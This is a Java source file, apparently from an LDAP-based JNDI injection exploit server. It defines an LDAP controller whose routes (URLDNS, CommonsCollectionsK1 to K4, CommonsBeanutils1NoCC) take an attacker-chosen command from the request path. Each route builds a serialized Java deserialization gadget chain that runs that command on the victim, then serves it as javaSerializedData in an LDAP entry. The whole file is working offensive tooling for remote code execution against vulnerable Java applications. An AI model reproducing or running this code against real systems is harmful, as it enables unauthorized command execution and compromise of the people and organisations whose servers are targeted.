package com.example.exploit.controller;

import com.example.exploit.gadget.*;
import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.util.ReflectUtil;
import com.example.exploit.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.unboundid.ldap.sdk.Entry;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.*;

@LdapController
@LdapMapping("/Deserialize")
public class DeserializeController {
    public static void processResult(Hashtable<String, String> params, Entry e) throws Exception {
        String className = params.get("className");
        byte[] data = Base64.getDecoder().decode(params.get("data"));

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", data);
    }

    @LdapMapping("/URLDNS/{url}")
    public static void URLDNS(Hashtable<String, String> params) throws Exception {
        String url = params.get("url");
        byte[] data = URLDNS.create(url);

        System.out.println("[Deserialize] Gadget: URLDNS Url: " + url);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @LdapMapping("/CommonsCollectionsK1/Command/{cmd}")
    public static void CommonsCollectionsK1(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK1.create(templatesImpl);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK1 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @LdapMapping("/CommonsCollectionsK2/Command/{cmd}")
    public static void CommonsCollectionsK2(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsCollectionsK2.create(templatesImpl);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK2 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @LdapMapping("/CommonsCollectionsK3/Command/{cmd}")
    public static void CommonsCollectionsK3(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        byte[] data = CommonsCollectionsK3.create(cmd);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK3 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @LdapMapping("/CommonsCollectionsK4/Command/{cmd}")
    public static void CommonsCollectionsK4(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        byte[] data = CommonsCollectionsK4.create(cmd);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK4 Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }

    @LdapMapping("/CommonsBeanutils1NoCC/Command/{cmd}")
    public static void CommonsBeanutils1NoCC(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);

        System.out.println("[Deserialize] Gadget: CommonsBeanutils1NoCC Cmd: " + cmd);
        params.put("data", Base64.getEncoder().encodeToString(data));
    }
}
